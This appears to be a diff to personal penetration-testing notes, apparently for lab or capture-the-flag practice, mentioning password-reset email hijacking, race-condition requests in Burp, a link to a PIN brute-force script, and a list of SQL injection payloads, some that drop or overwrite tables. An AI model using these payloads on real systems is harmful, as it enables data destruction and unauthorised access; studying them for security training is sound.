@@ -167,3 +167,17 @@ reset email veranderen en dan krijgj misschien email op de attackers email
 
 when sending money or other moneytary "values" send parralel requests, example:
 in burp request, send to repeat, edit things, add to group, duplicate request, send- in paralels
+
+
+
+
+https://github.com/TheSysRat/Hammer--THM/blob/main/pin-brute.py
+
+
+
+12345'; UPDATE books SET book_name = 'Hacked'; --
+12345'; DROP TABLE hello; --
+1' OR 1=1 --
+Intro to PHP' || 1=1 --
+1%27%0A||%0A1=1%0A--%27+
+
